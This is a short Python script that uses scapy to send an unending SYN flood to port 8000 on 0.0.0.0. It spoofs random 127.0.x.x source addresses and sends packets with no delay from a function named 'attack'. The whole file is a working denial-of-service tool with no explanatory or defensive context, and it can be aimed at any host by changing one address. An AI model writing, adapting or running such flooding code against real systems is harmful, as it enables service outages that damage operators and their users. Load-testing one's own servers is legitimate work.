import time
import random
from scapy.all import IP, TCP, send, conf, L3RawSocket

ip = IP(dst="0.0.0.0")
tcp = TCP(dport=8000, flags="S")
conf.L3socket=L3RawSocket

def attack():
  while True:
    ip.src=f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
    send(ip/tcp)
    time.sleep(0)

if __name__ == '__main__':
  attack()